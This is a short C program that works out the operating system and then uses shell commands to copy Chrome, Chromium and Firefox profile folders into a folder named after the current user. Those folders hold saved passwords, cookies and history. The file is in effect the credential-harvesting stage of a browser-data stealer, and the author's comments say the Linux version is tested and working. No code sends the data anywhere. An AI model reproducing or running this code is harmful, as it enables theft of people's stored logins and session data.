#include <stdio.h>
#include <stdlib.h>

#if defined(__Windows) || defined(_WIN32) || defined(_WIN64)
	#define SYS_OS 1
#elif defined(__linux__) || defined(__linux)
	#define SYS_OS 2
#elif defined(__APPLE__) && defined(__MACH__)
	#define SYS_OS 3
#else
	#error Unknown
#endif

void getWindows();
void getLinux();
void getMac();

int main(int argc, char* argv[])
{
	switch(SYS_OS){
		case 1:	getWindows();
				break;
		case 2:	getLinux();
				break;
		case 3:	getMac();
				break;
		default:printf("Error\n");	
	}
    return 0;
}

/*
	Still some BLOB errors
*/

void getWindows(){
	
		system("mkdir %username%");
	
		system("robocopy \"C:\\Users\\%username%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\" %username%");
	
		system("robocopy \"C:\\Users\\%username%\\AppData\\Local\\Google\\Chromium\\User Data\\Default\" %username%");
	
		//system("robocopy /COPYALL C:\\Users\\%username%\\AppData\\Local\\Microsoft %username%");

}




/*
	For linux it works like sharm
	tested and aprouved
*/

void getLinux(){
	system("mkdir `whoami`");
	system("cp -r ~/.config/chromium/Default/* `whoami`");
	system("cp -r ~/.config/google-chrome/Default/* `whoami`");
	system("cp -r ~/.mozilla/firefox/`grep -i path= ~/.mozilla/firefox/profiles.ini | cut -d = -f 2`/* `whoami`");
}

void getMac(){
	system("mkdir `id -un`");
	system("cp 'Users/`id -un`/Library/Application Support/Google/Chrome/Default/*' `id -un`");
	system("cp 'Users/`id -un`/Library/Application Support/Google/Chromium/Default/*' `id -un`");
	//system("cp '' `id -iun`")
}


